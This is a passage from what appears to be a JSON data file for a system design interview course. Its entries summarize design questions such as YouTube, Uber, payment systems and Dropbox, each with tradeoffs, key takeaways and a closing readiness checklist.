    {
      "id": "mc-q8",
      "tabTitle": "Q8: YouTube",
      "title": "Question 8. Design YouTube",
      "section": "Module 2 · Consumer-Scale Applications",
      "whatItIs": "Video-sharing platform with resumable chunked uploads, distributed transcoding DAGs, HLS/DASH adaptive bitrate streaming, and CDN edge delivery.",
      "tradeoffs": [
        "Several resolutions (broaden device support, but raise storage and encoding costs)",
        "Adaptive streaming (improves viewing experience, demands more processing and player logic)"
      ],
      "keyTakeaway": "Stream bytes directly to object storage; transcode into multi-bitrate HLS/DASH segments asynchronously; serve playback via CDN edge."
    }
  ],
  "30": [
    {
      "id": "mc-q9",
      "tabTitle": "Q9: Uber",
      "title": "Question 9. Design Uber",
      "section": "Module 2 · Consumer-Scale Applications",
      "whatItIs": "Ride-hailing platform with high-frequency driver location ingestion, geospatial indexing (H3 / Geohash), candidate ranking, and atomic trip matching.",
      "tradeoffs": [
        "More frequent location pings (improve freshness, but drain phone battery and bandwidth)",
        "Serial driver offers (simple locks, slower matching) vs. Parallel offers (faster matching, more contention)"
      ],
      "keyTakeaway": "Separate ephemeral location indexing from durable trip records; use atomic conditional writes to guarantee a driver is assigned to at most one trip."
    }
  ],
  "31": [
    {
      "id": "mc-q10",
      "tabTitle": "Q10: Food Delivery",
      "title": "Question 10. Design a Food Delivery Platform",
      "section": "Module 2 · Consumer-Scale Applications",
      "whatItIs": "Connects customers, restaurants, and delivery partners with cached menus, idempotent order submission, payment orchestration, and courier matching.",
      "tradeoffs": [
        "Saga-style compensation (replaces distributed 2PC, demands durable retries on compensation failures)",
        "Strict checkout validation (improves correctness, adds latency)"
      ],
      "keyTakeaway": "Store price snapshots in order lines to protect past orders; orchestrate order confirmation, payment, and courier dispatch using sagas."
    }
  ],
  "32": [
    {
      "id": "mc-q11",
      "tabTitle": "Q11: Web Crawler",
      "title": "Question 11. Design a Web Crawler",
      "section": "Module 3 · Data-Intensive Systems",
      "whatItIs": "Distributed crawler starting from seed URLs, scheduling via polite URL frontiers, caching robots.txt, Bloom filter deduplication, and S3 content storage.",
      "tradeoffs": [
        "Aggressive crawling (freshens index faster, but burns bandwidth and risks overloading origin sites)",
        "Bloom filters for URL deduplication (fast in-memory checks, but false positives cause some pages to be skipped)"
      ],
      "keyTakeaway": "Shard the URL frontier by host to enforce politeness; canonicalize URLs and deduplicate with Bloom filters; store page bodies in object storage."
    }
  ],
  "33": [
    {
      "id": "mc-q12",
      "tabTitle": "Q12: Autocomplete",
      "title": "Question 12. Design Search Autocomplete",
      "section": "Module 3 · Data-Intensive Systems",
      "whatItIs": "Prefix query suggestion service with in-memory tries, precomputed top-K candidates at prefix nodes, caching, and versioned offline index rollouts.",
      "tradeoffs": [
        "In-memory Tries (intuitive and fast O(p) traversal, but consume considerable RAM)",
        "Precomputed top-K results (cut request-time calculation, but suggestions may lag newly emerging trends)"
      ],
      "keyTakeaway": "Precompute top-K results at each trie prefix node; swap index snapshots atomically in memory without rebuilding the live index."
    }
  ],
  "34": [
    {
      "id": "mc-q13",
      "tabTitle": "Q13: Logging & Monitoring",
      "title": "Question 13. Design a Logging and Monitoring System",
      "section": "Module 3 · Data-Intensive Systems",
      "whatItIs": "Telemetry ingestion pipeline with edge ring buffers, Kafka buffering, hot search indexes (OpenSearch), time-series metric rollups, and cold S3 archives.",
      "tradeoffs": [
        "Indexing every field (aids rich search, but dramatically raises memory and storage costs)",
        "High-cardinality metric labels (enable fine-grained views, but can crash time-series metric databases)"
      ],
      "keyTakeaway": "Buffer at edge with bounded limits so business apps never block; tier storage into hot search (7–14 days) and cold compressed S3 Parquet."
    }
  ],
  "35": [
    {
      "id": "mc-q14",
      "tabTitle": "Q14: Real-Time Analytics",
      "title": "Question 14. Design a Real-Time Analytics Pipeline",
      "section": "Module 3 · Data-Intensive Systems",
      "whatItIs": "Continuous stream processing with Kafka, Flink windowing on event time, watermarks for late events, deduplication, and real-time OLAP stores.",
      "tradeoffs": [
        "Bigger time windows (cut per-event overhead, but postpone when updated figures appear on dashboards)",
        "At-least-once delivery (resilient across network blips, but forces idempotent aggregation logic at the sink)"
      ],
      "keyTakeaway": "Compute aggregations on event time using watermarks for late arrivals; dual-path enables live OLAP dashboards with batch reconciliation."
    }
  ],
  "36": [
    {
      "id": "mc-q15",
      "tabTitle": "Q15: Task Scheduler",
      "title": "Question 15. Design a Distributed Task Scheduler",
      "section": "Module 3 · Data-Intensive Systems",
      "whatItIs": "Fires one-shot and recurring jobs with timing wheels, time-bounded database leases, durable queues, worker heartbeats, and audit trails.",
      "tradeoffs": [
        "Database polling (simple to implement, but creates heavy I/O contention at millions of rows)",
        "At-least-once dispatch (resilient, but requires idempotent execution handlers downstream)"
      ],
      "keyTakeaway": "Separate task definitions from execution records; claim due runs with atomic time-bounded leases; handle failovers with heartbeats."
    }
  ],
  "37": [
    {
      "id": "mc-q16",
      "tabTitle": "Q16: E-Commerce Platform",
      "title": "Question 16. Design an E-Commerce Platform",
      "section": "Module 4 · Business-Critical Systems",
      "whatItIs": "E-commerce platform covering product catalog, shopping cart, checkout, atomic inventory holds, orders, and payment orchestration.",
      "tradeoffs": [
        "Relational transactions (guarantee inventory correctness, but can bottleneck during flash sales)",
        "Temporary inventory holds (prevent overselling, but tie up stock if users abandon checkout)"
      ],
      "keyTakeaway": "Use atomic conditional SQL updates (WHERE available_qty >= :qty) to prevent negative inventory; snap price on order creation; ensure idempotent checkout."
    }
  ],
  "38": [
    {
      "id": "mc-q17",
      "tabTitle": "Q17: Ticket Booking",
      "title": "Question 17. Design a Ticket Booking System",
      "section": "Module 4 · Business-Critical Systems",
      "whatItIs": "Event ticketing with numbered seating, 5-minute optimistic holds, payment coordination, automatic hold expiry, and anti-double booking guarantees.",
      "tradeoffs": [
        "Brief holds (free inventory faster, but frustrate slow payers) vs. Longer holds (ease checkout, but shrink sellable seats)",
        "Redis locks alone (fast, but insufficient durability) vs. Authoritative DB conditional state transitions"
      ],
      "keyTakeaway": "Atomic state transitions from AVAILABLE to HELD ensure at most one buyer claims a seat; background cleanup clears abandoned holds safely."
    }
  ],
  "39": [
    {
      "id": "mc-q18",
      "tabTitle": "Q18: Payment System",
      "title": "Question 18. Design a Payment System",
      "section": "Module 4 · Business-Critical Systems",
      "whatItIs": "Payment service with idempotency keys, payment state machines, immutable double-entry ledger entries, provider webhooks, and reconciliation.",
      "tradeoffs": [
        "Synchronous provider calls (simple initial response, but leave timeout ambiguity)",
        "Double-entry ledger (guarantees auditability, but demands strict accounting balance rules)"
      ],
      "keyTakeaway": "Enforce idempotency keys on payment initiation; verify webhook signatures; record immutable double-entry ledger lines; run daily reconciliation."
    }
  ],
  "40": [
    {
      "id": "mc-q19",
      "tabTitle": "Q19: Cloud File Storage",
      "title": "Question 19. Design a Cloud File Storage Service like Dropbox",
      "section": "Module 4 · Business-Critical Systems",
      "whatItIs": "Cloud storage where users upload files, sync across devices with cursors, manage versions, share files, and resolve simultaneous edit conflicts.",
      "tradeoffs": [
        "Chunking (resilient file transfers, but adds block metadata overhead)",
        "Optimistic concurrency (allows offline edits, but demands conflict copy creation on collision)"
      ],
      "keyTakeaway": "Upload chunked blocks directly to object storage; client sync cursors pull deltas reliably after disconnects; retain conflict copies on clash."
    }
  ],
  "41": [
    {
      "id": "mc-q20",
      "tabTitle": "Q20: Ad Impression Tracking",
      "title": "Question 20. Design an Ad Impression Tracking System",
      "section": "Module 4 · Business-Critical Systems",
      "whatItIs": "Pipeline ingesting ad impressions at 100K-500K eps, deduplicating with stable event IDs, event-time window aggregation, and batch reconciliation.",
      "tradeoffs": [
        "Durable streaming (adds resilience and replay, but introduces operational overhead)",
        "Near-real-time aggregation (responsive dashboards, while numbers remain provisional until batch reconciliation)"
      ],
      "keyTakeaway": "Deduplicate on stable event IDs; compute real-time OLAP window rollups for dashboards; reconcile against raw archive for authoritative billing."
    }
  ],
  "42": [
    {
      "id": "mc-checklist",
      "tabTitle": "Final Checklist",
      "title": "Final Interview Checklist & 6 Core Principles",
      "section": "Capstone · Masterclass Wrap-Up",
      "whatItIs": "The 10-point system design readiness checklist, the 6 core architectural principles, and revised content scope from the Masterclass.",
      "tradeoffs": [
        "Premature over-engineering (complex distributed systems) vs. Smallest viable architecture that satisfies scale targets",
        "Passive review vs. Active 10-point readiness audit"
      ],
      "keyTakeaway": "Begin with the smallest design that satisfies requirements; tie every architectural pick to a concrete rationale; verify all 10 checklist points."
    }
  ]
};
